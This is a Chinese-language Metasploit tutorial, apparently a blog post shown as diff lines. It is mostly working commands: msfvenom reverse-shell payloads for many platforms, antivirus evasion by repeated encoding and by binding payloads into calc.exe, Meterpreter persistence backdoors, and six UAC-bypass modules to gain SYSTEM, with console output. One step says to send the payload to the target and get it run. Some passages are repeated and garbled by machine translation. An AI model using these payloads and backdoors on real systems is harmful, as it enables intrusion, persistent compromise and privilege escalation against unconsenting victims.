+<li><ol start="37">
+<li>winenum</li>
+</ol>
+<p>会自动运行多种命令，将命令结果保存到本地</p>
+</li>
+</ul>
+<h1 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h1><p>metasploit-framework旗下的msfpayload（荷载生成器），msfencoder（编码器），msfcli（监听接口）已经被整合成msfvenom。可以利用msfvenom生成木马程序，并且目标机上执行，在本地做监听</p>
+<ul>
+<li>1.msfvenom命令行选项</li>
+</ul>
+<p>在kali的命令行中输入msfvenom -h就会显示其用法：</p>
+<blockquote>
+<p>-p, –payload<payload>    指定需要使用的payload(攻击荷载)</p>
+<p>-l, –list[module_type]  列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</p>
+<p>-n, –nopsled<length>    为payload预先指定一个NOP滑动长度</p>
+<p>-f, –format<format>    指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表)</p>
+<p>-e, –encoder[encoder]    指定需要使用的encoder（编码器）</p>
+<p>-a, –arch<architecture> 指定payload的目标架构</p>
+<p>–platform  <platform>   指定payload的目标平台</p>
+<p>-s, –space<length>    设定有效攻击荷载的最大长度</p>
+<p>-b, –bad-chars<list>     设定规避字符集，比如: &#039;\x00\xff&#039;</p>
+<p>-i, –iterations <count>     指定payload的编码次数</p>
+<p>-c, –add-code<path>     指定一个附加的win32 shellcode文件</p>
+<p>-x, –template<path>     指定一个自定义的可执行文件作为模板</p>
+<p>-k, –keep            保护模板程序的动作，注入的payload作为一个新的进程运行</p>
+<p>–payload-options      列举payload的标准选项</p>
+<p>-o, –out<path>        保存payload</p>
+<p>-v, –var-name <name>      指定一个自定义的变量，以确定输出格式</p>
+<p>–shellest          最小化生成payload</p>
+<p>-h, –help            查看帮助选项</p>
+<p>–help-formats        查看msf支持的输出格式列表</p>
+</blockquote>
+<ul>
+<li><p>2.生成payload 格式说明</p>
+<ul>
+<li>（1）生成不经过编码的普通payload（不编码-&gt;生成内容固定-&gt;直接被杀）</li>
+</ul>
+<p>#格式</p>
+<p>msfvenom -p <payload> <payload options> -f <format> -o <path></p>
+<p>#实例</p>
+<p>msfvenom –p windows/meterpreter/reverse_tcp –f c –o 1.c</p>
+<ul>
+<li>（2）经过编码器处理后生成payload</li>
+</ul>
+<p>#格式</p>
+<p>msfvenom -p <payload> -e <encoder > -i <encoder times> -n <nopsled> -f <format> -o <path></p>
+<p>#实例</p>
+<p>msfvenom –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –f exe –o C:\back.exe</p>
+<ul>
+<li><p>（3）捆绑到正常文件后生成payload（暂未测试是否可加-e参数）</p>
+<p>Msfvenom –p windows/meterpreter/reverse_tcp –platform windows –a x86 –x C:\calc.exe –k –f exe –o C:\shell.exe</p>
+<p>-p [指定攻击载荷名称]</p>
+<p>生成payload至少需指定-p 和 -f，除了自带的那些payload外。-p -可指定自定义的payload ，如：</p>
+<p>cat payload_file.bin | msfvenom -p - -a x86 –platform win -e x86/shikata_ga_nai -f raw</p>
+<p>#暂未测试</p>
+<p>cat 1.exe | msfvenom -p - -a x86 –platform win -e x86/shikata_ga_nai -f exe -o 2.exe</p>
+<p>-f [指定payload的输出格式]</p>
+<p>按需要的格式进行输出：<br>十六进制hex编码形式 \x0a，如果用python写exploit，用-f python得到python代码。如果用python写exploit，用-f c得到c代码。生成一个exe格式的payload，如：<br>msfvenom -p windows/meterpreter/bind_tcp -f exe</p>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code>&gt;msf支持的输出格式
+&gt;
+&gt;msfvenom --help-formats
+&gt;
+&gt;Executable formats
+&gt;
+&gt;asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war
+&gt;
+&gt;Transform formats
+&gt;
+&gt;bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript</code></pre>
+<ul>
+<li><p>3 查看支持的payload列表：</p>
+<p>msfvenom -l payloads</p>
+<p>查看支持的输出文件类型：</p>
+<p>msfvenom –help-formats</p>
+<p>查看支持的编码方式：(为了达到免杀的效果)</p>
+<p>msfvenom -l encoders</p>
+<p>查看支持的空字段模块：(为了达到免杀的效果)</p>
+<p>msfvenom -l nops</p>
+</li>
+<li><p>4.常用的payload</p>
+</li>
+</ul>
+<p>1.命令格式:</p>
+<p>msfvenom -p <payload> <payload options> -f <format> -o <path></p>
+<p>Binaries：</p>
+<p>2.Linux:</p>
+<p>反向连接</p>
+<p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf &gt; shell.elf</p>
+<p>正向连接</p>
+<p>msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=<Target IP Address> LPORT=<Your Port to Connect On> -f elf &gt; shell.elf</p>
+<p>3.Windows:</p>
+<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe &gt; shell.exe</p>
+<p>（反向连接）</p>
+<p>4.Mac:</p>
+<p>msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho &gt; shell.macho</p>
+<p>Web Payloads：</p>
+<p>5.PHP:</p>
+<p>msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.php</p>
+<p>cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</p>
+<blockquote>
+<p><code>pbcopy</code> 命令将文本从 stdin 复制到剪贴板缓冲区。</p>
+<p><code>pbpaste</code> 命令以显示剪贴板中</p>
+</blockquote>
+<p>6.ASP:</p>
+<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp &gt; shell.asp</p>
+<p>7.JSP:</p>
+<p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.jsp</p>
+<p>8.WAR:</p>
+<p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war &gt; shell.wa</p>
+<p>Scripting Payloads：</p>
+<p>9.Python:</p>
+<p>msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.py</p>
+<p>10.Bash:</p>
+<p>msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.sh</p>
+<p>11.Perl:</p>
+<p>msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.pl</p>
+<p>Shellcode：</p>
+<p>12.Linux Based Shellcode:</p>
+<p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language></p>
+<p>13.Windows Based Shellcode:</p>
+<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language></p>
+<p>14.Mac Based Shellcode:</p>
+<p>msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language></p>
+<p>15.Handlers：</p>
+<p>use exploit/multi/handler</p>
+<p>  set PAYLOAD <Payload name></p>
+<p>  set LHOST <LHOST value></p>
+<p>  set LPORT <LPORT value></p>
+<p>  set ExitOnSession false</p>
+<p>  exploit -j -z</p>
+<p>5.生成有效载荷格式说明</p>
+<p>生成不经过编码的普通净荷（不编码 - &gt;生成内容固定 - &gt;直接被杀）</p>
+<p>#格式</p>
+<p>msfvenom -p <payload> <payload options> -f <format> -o <path></p>
+<p>#实例</p>
+<p>msfvenom –p windows/meterpreter/reverse_tcp –f c –o 1.c</p>
+<p>经过编码器处理后生成的有效载荷</p>
+<p>#格式</p>
+<p>msfvenom -p <payload> -e <encoder > -i <encoder times> -n <nopsled> -f <format> -o <path></p>
+<p>#实例</p>
+<p>msfvenom –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –f exe –o C:\back.exe</p>
+<p>捆绑到正常文件后生成有效载荷（暂未测试是否可加-e参数）</p>
+<p>Msfvenom –p windows/meterpreter/reverse_tcp –platform windows –a x86 –x C:\calc.exe –k –f exe –o C:\shell.exe</p>
+<p>-p [指定攻击载荷名称]</p>
+<p>生成有效负荷至少需指定-p和-f</p>
+<p>除了自带的那些有效载荷外<br>-p -可指定自定义的有效载荷，如：</p>
+<p>cat payload_file.bin | msfvenom -p - -a x86 –platform win -e x86/shikata_ga_nai -f raw</p>
+<p>#暂未测试</p>
+<p>cat 1.exe | msfvenom -p - -a x86 –platform win -e x86/shikata_ga_nai -f exe -o 2.exe</p>
+<p>-f [指定有效载荷的输出格式]</p>
+<p>按需要的格式进行输出：<br>十六进制十六进制形式编码\x0a<br>如果用蟒写利用，用-f python得到蟒代码。<br>如果用蟒写利用，用-f c得到Ç代码。</p>
+<p>生成一个EXE格式的有效载荷，如：<br>msfvenom -p windows/meterpreter/bind_tcp -f exe</p>
+<p>无国界医生支持的输出格式</p>
+<p>msfvenom –help-formats</p>
+<p>Executable formats</p>
+<p>  asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war</p>
+<p>Transform formats</p>
+<p>  bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript</p>
+<p>- 一个x64</p>
+<p>-a x86<br>-a x86_64</p>
+<p>msfvenom -p windows/meterpreter/bind_tcp –help-platform</p>
+<p>Platforms</p>
+<p>  aix, android, bsd, bsdi, cisco, firefox, freebsd, hardware, hpux, irix, java, javascript, linux, mainframe, multi, netbsd, netware, nodejs, openbsd, osx, php, python, ruby, solaris, unix, windows</p>
+<p>-a不指定也可以，可在-p后的有效载荷名称中明确指定的建筑，如：</p>
+<p>msfvenom -p linux/x86/exec CMD=/bin/sh</p>
+<p>此有效载荷指定了参数CMD<br>查看某个有效载荷具体需要哪些参数（必需是是则必需该参数）<br>msfvenom -p linux/x86/exec –payload-options</p>
+<ul>
+<li>5 生成有效载荷格式说明 (对有效载荷进行编码)</li>
+</ul>
+<p>1.规避特殊字符-b’/ x00一个特殊字符列表’</p>
+<p>无国界医生会自动找一个合适的编码器规避有效载荷中的这些“坏字符”：<br>msfvenom -p windows/meterpreter/bind_tcp -b ‘\x00’ -f raw</p>
+<p>Found 10 compatible encoders</p>
+<p>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</p>
+<p>不同的函数，有不同的规避字符：<br>如获取需要就避免/x0a<br>如scanf函数更严格，空白不允许符<br>如产生一段高管的shellcode的</p>
+<p>2.用-e选项指定编码器的编码器，如：</p>
+<p>msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw</p>
+<p>默认的输出格式是原始的，直接输出有效载荷的字符（含乱码），常加参数-o写到文件中。</p>
+<p>3.使用-i进行选项对话多次编码<br>迭代编码也许会有规避杀毒软件的作用英文，但这不是真正的免杀。</p>
+<p>迭代编码例子：<br>msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3</p>
+<p>无国界医生组织中所有的编码器：</p>
+<p>msfvenom -l encoders</p>
+<p>Framework Encoders</p>
+<p>==================</p>
+<p>  Name             Rank    Description</p>
+<hr>
+<p>  cmd/echo           good    Echo Command Encoder</p>
+<p>cmd/generic_shmanual   Generic Shell Variable Substitution Command Encoder</p>
+<p>  cmd/ifs            low    Generic ${IFS} Substitution Command Encoder</p>
+<p>  cmd/perl           normal   Perl Command Encoder</p>
+<p>  cmd/powershell_base64     excellent Powershell Base64 Command Encoder</p>
+<p>cmd/printf_php_mqmanual   printf(1) via PHP magic_quotes Utility Command Encoder</p>
+<p>generic/eicarmanual   The EICAR Encoder</p>
+<p>generic/none         normal   The “none” Encoder</p>
+<p>mipsbe/byte_xorinormal   Byte XORi Encoder</p>
+<p>mipsbe/longxornormal   XOR Encoder</p>
+<p>mipsle/byte_xorinormal   Byte XORi Encoder</p>
+<p>mipsle/longxor         normal   XOR Encoder</p>
+<p>  php/base64          great   PHP Base64 Encoder</p>
+<p>ppc/longxornormal   PPC LongXOR Encoder</p>
+<p>ppc/longxor_tagnormal   PPC LongXOR Encoder</p>
+<p>sparc/longxor_tag       normalSPARC DWORD XOR Encoder</p>
+<p>  x64/xor            normal   XOR Encoder</p>
+<p>x64/zutto_dekirumanual   Zutto Dekiru</p>
+<p>x86/add_submanual   Add/Sub Encoder</p>
+<p>x86/alpha_mixedlow    Alpha2 Alphanumeric Mixedcase Encoder</p>
+<p>x86/alpha_upperlow    Alpha2 Alphanumeric Uppercase Encoder</p>
+<p>x86/avoid_underscore_tolowermanual   Avoid underscore/tolower</p>
+<p>x86/avoid_utf8_tolowermanual   Avoid UTF8/tolower</p>
+<p>  x86/bloxor          manual   BloXor - A Metamorphic Block Based XOR Encoder</p>
+<p>x86/bmp_polyglotmanual   BMP Polyglot</p>
+<p>x86/call4_dword_xornormal   Call+4 Dword XOR Encoder</p>
+<p>x86/context_cpuid       manual   CPUID-based Context Keyed Payload Encoder</p>
+<p>x86/context_statmanual   stat(2)-based Context Keyed Payload Encoder</p>
+<p>x86/context_timemanual   time(2)-based Context Keyed Payload Encoder</p>
+<p>x86/countdown         normal   Single-byte XOR Countdown Encoder</p>
+<p>x86/fnstenv_movnormal   Variable-length Fnstenv/mov Dword XOR Encoder</p>
+<p>x86/jmp_call_additivenormal   Jump/Call XOR Additive Feedback Encoder</p>
+<p>x86/nonalpha          low    Non-Alpha Encoder</p>
+<p>x86/nonupperlow    Non-Upper Encoder</p>
+<p>x86/opt_submanual   Sub Encoder (optimised)</p>
+<p>x86/servicemanual   Register Service</p>
+<p>x86/shikata_ga_nai      excellent Polymorphic XOR Additive Feedback Encoder</p>
+<p>x86/single_static_bitmanual   Single Static Bit</p>
+<p>x86/unicode_mixedmanual   Alpha2 Alphanumeric Unicode Mixedcase Encoder</p>
+<p>x86/unicode_uppermanual   Alpha2 Alphanumeric Unicode Uppercase Encoder</p>
+<p>-x指定一个模板文件（“捆绑”payload到这个正常的可执行文件）</p>
+<p>msfvenom使用的模板文件保存在目录msf/data/templates</p>
+<p>-x calc.exe<br>捆绑有效负载到正常文件（模板文件=宿主文件=自定义的可执行文件）</p>
+<p>使用-x选项指定你自己的模板文件（如EXE等），如：<br>使用windows 下的CALC.EXE作为模板文件，生成有效载荷：</p>
+<p>msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; new.exe</p>
+<ul>
+<li>6 搜索</li>
+</ul>
+<blockquote>
+<p>msfvenom -l | grep windows | grep x64 | grep tcp</p>
+</blockquote>
+<ul>
+<li>7 绕过免杀</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/Veil-Framework/Veil-Evasion">https://github.com/Veil-Framework/Veil-Evasion</a></p>
+<p>paload生成器，免杀效果好</p>
+<ul>
+<li>8 系统架构</li>
+</ul>
+<blockquote>
+<p>Arch:x86　 是指生成的payload只能在32位系统运行<br>Arch:x86_64　是指模块同时兼容32位操作系统和64位操作系统<br>Arch:x64 是指生成的payload只能在64位系统运行</p>
+</blockquote>
+<p>注意 :</p>
+<p>有的payload的选项为多个：Arch:x86_64，x64<br>这里你就需要-a参数选择一个系统架构。<br>同时注意以下：size(大小)，rank(等级)，exitfunc(退出方法)</p>
+<h1 id="获取meterpreter"><a href="#获取meterpreter" class="headerlink" title="获取meterpreter"></a>获取meterpreter</h1><p>1.首先生成可执行文件</p>
+<p>root @ kali：〜＃msfvenom -p  windows/meterpreter/reverse_tcp lhost=192.168.1.102 lport=4444 -f exe -o  shell.exe</p>
+<p>2.启动msfconsole，监听反连端口</p>
+<p>root @ kali：〜＃msfconsole</p>
+<p>msf&gt;use exploit/multi /handler</p>
+<p>msf exploit（handler）&gt; set  PAYLOAD windows/meterpreter/reverse_tcp</p>
+<p>PAYLOAD =&gt; window /meterpreter/reverse_tcp</p>
+<p>msf exploit（handler）&gt; set LHOST 0.0.0.0</p>
+<p>msf exploit（handler）&gt;set LPORT  444</p>
+<p>msf exploit（handler）&gt;show options</p>
+<p>msf exploit（handler）&gt;exploit</p>
+<h1 id="持续性后门"><a href="#持续性后门" class="headerlink" title="持续性后门"></a>持续性后门</h1><h2 id="metsvc后渗透攻击模块"><a href="#metsvc后渗透攻击模块" class="headerlink" title="metsvc后渗透攻击模块"></a>metsvc后渗透攻击模块</h2><p>metsvc后渗透攻击模块其实就是将Meterpreter以系统服务的形式安装到目标主机，它会上传三个文件：</p>
+<p>metsvc.dll</p>
+<p>metsvc-service.exe</p>
+<p>metsvc.exe</p>
+<p>调用metsvc后渗透攻击模块</p>
+<p>命令：run metsvc</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/a0f52689c4ff970e3cc7637199f3a7d1.gif" alt="img"></p>
+<p>执行过程：在目标主机上创建一个监听31337端口的服务-&gt;在目标主机c:\windows\temp\下创建一个存放后门服务有关文件程序的目录，并上传metsrv.x86.dll、metsvc-server.exe、metsvc.exe三个文件到该目录下-&gt;开启服务</p>
+<p>成功后：在目标主机上看到31337号端口已开，且服务多了一个meterpreter</p>
+<p>Meterpreter服务后门</p>
+<p><code>meterpreter &gt; run metsvc</code></p>
+<p>[*] Creating a meterpreter service on port 31337</p>
+<p>[*] Creating a temporary installation directory C:\Users\Croxy\AppData\Local\Temp\tuIKWqmuO…</p>
+<p>[*] &gt;&gt; Uploading metsrv.x86.dll…</p>
+<p>[*] &gt;&gt; Uploading metsvc-server.exe…</p>
+<p>[*] &gt;&gt; Uploading metsvc.exe…</p>
+<p>[*] Starting the service…</p>
+<p>* Installing service metsvc</p>
+<p>* Starting service</p>
+<p>* Service metsvc successfully installed.</p>
+<p>之后电脑就默默生成了一个自启服务Meterpreter</p>
+<p><code>然后开始连接后门</code></p>
+<p>msf exploit(handler) &gt; use exploit/multi/handler</p>
+<p>msf exploit(handler) &gt; set payload windows/metsvc_bind_tcp</p>
+<p>payload =&gt; windows/metsvc_bind_tcp</p>
+<p>msf exploit(handler) &gt; set RHOST 10.42.0.54</p>
+<p>RHOST =&gt; 10.42.0.54</p>
+<p>msf exploit(handler) &gt; set LPORT 31337</p>
+<p>LPORT =&gt; 31337</p>
+<p>msf exploit(handler) &gt; exploit</p>
+<h2 id="persistence模块后门"><a href="#persistence模块后门" class="headerlink" title="persistence模块后门"></a>persistence模块后门</h2><p><strong>一个vbs后门写入了开机启动项但是容易被发现还是需要大家发挥自己的智慧:)</strong></p>
+<blockquote>
+<p>meterpreter &gt; run persistence -X -i 5 -p 23333 -r 10.42.0.1</p>
+<p>[*] Running Persistance Script</p>
+<p>[*] Resource file for cleanup created at /home/croxy/.msf4/logs/persistence/TESTING_20150930.3914/TESTING_20150930.3914.rc</p>
+<p>[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=10.42.0.1 LPORT=23333</p>
+<p>[*] Persistent agent script is 148453 bytes long</p>
+<p>[+] Persistent Script written to C:\Users\Croxy\AppData\Local\Temp\ulZpjVBN.vbs</p>
+<p>[*] Executing script C:\Users\Croxy\AppData\Local\Temp\ulZpjVBN.vbs</p>
+<p>[+] Agent executed with PID 4140</p>
+<p>[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\okiASNRzcLenulr</p>
+<p>[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\okiASNRzcLenulr</p>
+</blockquote>
+<h2 id="meterpreter绕过uac"><a href="#meterpreter绕过uac" class="headerlink" title="meterpreter绕过uac"></a>meterpreter绕过uac</h2><h3 id="什么是用户帐户控制-UAC-？"><a href="#什么是用户帐户控制-UAC-？" class="headerlink" title="什么是用户帐户控制(UAC)？"></a><strong>什么是用户帐户控制(UAC)？</strong></h3><p>Microsoft的Windows Vista和Windows Server 2008操作系统引入了一种良好的用户帐户控制架构，以防止系统范围内的意外更改，这种更改是可以预见的，并且只需要很少的操作量。</p>
+<p>换句话说，它是Windows的一个安全功能，它支持防止对操作系统进行未经授权的修改，UAC确保仅在管理员授权的情况下进行某些更改。如果管理员不允许更改，则不会执行这些更改，并且Windows系统保持不变。</p>
+<h3 id="UAC如何运行？"><a href="#UAC如何运行？" class="headerlink" title="UAC如何运行？"></a><strong>UAC如何运行？</strong></h3><p>UAC通过阻止程序执行任何涉及有关系统更改/特定任务的任务来运行。除非尝试执行这些操作的进程以管理员权限运行，否则这些操作将无法运行。如果您以管理员身份运行程序，则它将具有更多权限，因为它将被“提升权限”，而不是以管理员身份运行的程序。</p>
+<blockquote>
+<p>一些没有管理员权限无法完成的操作：</p>
+<ul>
+<li>注册表修改（如果注册表项在HKEY_LOCAL_MACHINE下（因为它影响多个用户），它将是只读的）</li>
+<li>加载设备驱动程序</li>
+<li>DLL注入</li>
+<li>修改系统时间（时钟）</li>
+<li>修改用户帐户控制设置（通过注册表，可以启用/禁用该设置，但您需要正确的权限才能执行此操作）</li>
+<li>修改受保护的目录（例如Windows文件夹，Program Files）</li>
+<li>计划任务（例如，以管理员权限自动启动）</li>
+</ul>
+<p>UAC不会自动阻止恶意软件，其目的不是确定程序是否是恶意软件。这同样取决于用户。如果将以管理员权限执行程序，则将提醒用户并且需要用户确认。</p>
+</blockquote>
+<h3 id="绕过uac的方法"><a href="#绕过uac的方法" class="headerlink" title="绕过uac的方法"></a>绕过uac的方法</h3><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>（1）生成一个 payload</p>
+<p>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.15.131 lport=4444 -f exe -o /root/virus.exe -e x86/shikata_ga_nai -i 8</p>
+<p><em>将以上生成的 payload 发送给目标机器并让其执行!</em></p>
+<p>（2）kali 上配置一个反弹会话处理程序</p>
+<p>msf&gt;use exploit/multi/handler</p>
+<p>msf&gt;set payload windows/meterpreter/reverse_tcp</p>
+<p>msf&gt;set LHOST 192.168.15.131</p>
+<p>msf&gt;set LPORT 4444</p>
+<p>msf&gt;exploit</p>
+<p>这里再介绍一种，生成反弹 shell 的方式。就是直接以 raw 的形式保存成文件只要目标进行了访问，就会反弹回 shell 。具体生成命令如下：</p>
+<p><strong>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.15.131 LPORT=4444 -f raw -o x.php</strong></p>
+<p><strong>当目标机器成功执行payload后我们就取得了一个 meterpreter shell 。</strong></p>
+<p>（3）利用 getuid 和 getsystem 命令来提权</p>
+<p>（4）进行UAC权限绕过</p>
+<blockquote>
+<p>msf&gt;use exploit/windows/local/ask</p>
+<p>msf&gt;show options</p>
+<p>msf&gt;set session 1</p>
+<p>msf&gt;exploit</p>
+</blockquote>
+<p>当我们成功执行以上命令后，我们会在目标系统上弹出一个确认框只要点击确认即可成功绕过！现在我们再来通过 getuid 和 getsystem 命令来查看当前我们的 shell 权限</p>
+<h5 id="方法二-：Windows权限升级绕过UAC保护"><a href="#方法二-：Windows权限升级绕过UAC保护" class="headerlink" title="方法二(：Windows权限升级绕过UAC保护)"></a>方法二(<strong>：Windows权限升级绕过UAC保护</strong>)</h5><p>此模块将通过进程注入使用可信任发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。</p>
+<p>msf &gt; use exploit/windows/local/bypassuac</p>
+<p>msf exploit windows/local/bypassuac) &gt; set session 1</p>
+<p>msf exploit(windows/local/bypassuac) &gt; exploit</p>
+<p>从给定的meterpreter中，您可以看到meterpreter会话2已打开，现在以下命令以确定system权限特权.</p>
+<p>getsystem</p>
+<p>getuid</p>
+<p>很好<strong>，</strong> 这里我们获得了NT AUTHORITY\SYSTEM 权限，现在如果你输入“ <strong>shell</strong> ”命令，你将获得具有管理员权限的命令提示符。</p>
+<h5 id="方法三-内存注入"><a href="#方法三-内存注入" class="headerlink" title="方法三(内存注入)"></a>方法三(内存注入)</h5><p>此模块将通过进程注入使用可信任的发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。在普通技术中，该模块使用反射式DLL注入技术并只除去了DLL payload 二进制文件，而不是三个单独的二进制文件。但是，它需要选择正确的体系架构（对于SYSWOW64系统也使用x64）。如果指定exe::custom，应在单独的进程中启动 payload 后调用ExitProcess（）。</p>
+<p>msf &gt; use exploit/windows/local/bypassuac_injection</p>
+<p>msf exploit(windows/local/bypassuac_injection) &gt; set session 1</p>
+<p>msf exploit(windows/local/bypassuac_injection) &gt; exploit</p>
+<p>从给定的meterpreter中，您可以看到meterpreter会话2已打开，现在输入以下命令以确定system权限特权。</p>
+<p>getsystem</p>
+<p>getuid</p>
+<p>最终你将获得NT AUTHORITY\SYSTEM 权限，现在如果你输入“ <strong>shell</strong> ”命令，你将获得具有管理员权限的命令提示符。</p>
+<h5 id="方法四-通过FodHelper注册表项"><a href="#方法四-通过FodHelper注册表项" class="headerlink" title="方法四(通过FodHelper注册表项)"></a>方法四(<strong>通过FodHelper注册表项</strong>)</h5><p>此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定exe:custom，则应在单独的进程中启动payload后调用ExitProcess（）。</p>
+<p>msf &gt; use exploit/windows/local/bypassuac_fodhelper</p>
+<p>msf exploit(windows/local/bypassuac_fodhelper) &gt; set session 1</p>
+<p>msf exploit(windows/local/bypassuac_fodhelper) &gt; exploit</p>
+<p>从给定的meterprer中，您可以看到meterpreter会话2已打开，现在输入以下命令以确定system权限特权。</p>
+<p>getsystem</p>
+<p>getuid</p>
+<p><strong>很好，</strong> 这里我们获得了NT AUTHORITY\SYSTEM 权限，现在如果你输入“ <strong>shell</strong> ”命令，你将获得具有管理员权限的命令提示符。</p>
+<h5 id="方法五-通过Eventvwr注册表项"><a href="#方法五-通过Eventvwr注册表项" class="headerlink" title="方法五(通过Eventvwr注册表项)"></a>方法五(<strong>通过Eventvwr注册表项</strong>)</h5><p>此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows事件查看器时调用的自定义命令来绕过Windows UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定EXE ::Custom，则应在单独的进程中启动payload后调用ExitProcess（）。</p>
+<p>msf &gt; use exploit/windows/local/bypassuac_eventvwr</p>
+<p>msf exploit(windows/local/bypassuac_eventvwr) &gt; set session 1</p>
+<p>msf exploit(windows/local/bypassuac_eventvwr) &gt; exploit</p>
+<p>从给定的meterpreter中，您可以看到meterpreter会话2已打开，现在输入以下命令以确定system权限特权。</p>
+<p>getsystem</p>
+<p>getuid</p>
+<p>您将再次获得NT AUTHORITY\SYSTEM 权限。</p>
+<h5 id="方法六-通过COM处理程序劫持"><a href="#方法六-通过COM处理程序劫持" class="headerlink" title="方法六(通过COM处理程序劫持)"></a>方法六(通过COM处理程序劫持)</h5><p>此模块将通过在hkcu配置单元中创建COM处理程序注册表项来绕过Windows UAC。当加载某些较高完整性级别进程时，会引用这些注册表项，从而导致进程加载用户控制的DLL。这些DLL包含导致会话权限提升的payload。此模块修改注册表项，但在调用payload后将清除该项。这个模块需要payload的体系架构和操作系统匹配，但是当前的低权限meterpreter会话体系架构中可能不同。如果指定exe:：custom，则应在单独的进程中启动payloa后调用ExitProcess（）。此模块通过目标上的cmd.exe调用目标二进制文件。因此，如果cmd.exe访问受到限制，此模块将无法正常运行。</p>
+<p>msf &gt; use exploit/windows/local/bypassuac_comhijack</p>
+<p>msf exploit(windows/local/bypassuac_comhijack) &gt; set session 1</p>
+<p>msf exploit(windows/local/bypassuac_comhijack) &gt; exploit</p>
+<p>从给定的meterpreter中，您可以看到meterpreter会话2已打开，现在键入以下命令以确定system权限特权。</p>
+<p>getsystem</p>
+<p>getuid</p>
+<p>最后，您将获得NT AUTHORITY\SYSTEM 权限，现在如果您再次运行“shell”命令，那么您将获得具有管理员权限的命令提示符访问权限，这样我们就可以通过Metasploit利用exploit来绕过UAC保护。</p>
+<blockquote>
+<p>HKCU下的是当前登录用户的注册表，切换用户就没了</p>
+<p>HKLM则是所有用户的注册表，不管你怎么切换用户数据都在</p>
+<p>一般情况下，HKCU一般拿来存储当前用户对软件的配置信息，而HKLM则是存储软件的安装信息和对所有用户设置的配置信息</p>
+</blockquote>
+<h1 id="meterprter实战攻击windows2008r2x64"><a href="#meterprter实战攻击windows2008r2x64" class="headerlink" title="meterprter实战攻击windows2008r2x64"></a>meterprter实战攻击windows2008r2x64</h1><p>攻击端:<br>OS:Kali<br>IP:192.168.111.129</p>
+<p>被害端:<br>OS:Windows server 2008 (64位)<br>IP:192.168.111.133</p>
+<p>(1)获取目标主机反弹shell</p>
+<p>首先在Kali上生成meterpreter的payloa</p>
+<p>root@Kali:~# msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.111.129 LPORT=2013 X &gt; file.exe </p>
+<p>接下来是配置监听:</p>
+<p>root@Kali:~# msfconsole</p>
+<p>msf &gt; use exploit/multi/handler</p>
+<p>msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</p>
